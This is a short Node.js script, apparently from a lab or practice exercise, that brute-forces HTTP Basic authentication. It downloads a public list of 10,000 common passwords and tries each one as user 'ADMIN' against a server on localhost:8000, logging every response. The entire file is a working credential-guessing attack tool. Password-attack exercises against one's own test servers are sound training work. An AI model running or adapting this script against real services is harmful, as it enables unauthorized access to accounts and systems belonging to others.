const axios = require('axios');

const passwords_github_url =
	'https://raw.githubusercontent.com/danielmiessler/SecLists/7fa58a2a2601528c0987aff228ebae780c62aea8/Passwords/Common-Credentials/10k-most-common.txt';

const bruteForce = async () => {
	try {
		await axios.get(passwords_github_url).then((response) => {
			const passwords = response.data.split('\n');
			passwords.forEach(async (password) => {
				try {
					const res = await axios.get('http://localhost:8000', {
						auth: {
							username: 'ADMIN',
							password: password,
						},
					});
					console.log(res.data.response);
				} catch (err) {
					console.log(err);
				}
			});
		});
	} catch (err) {
		console.log(err);
	}
};

bruteForce();
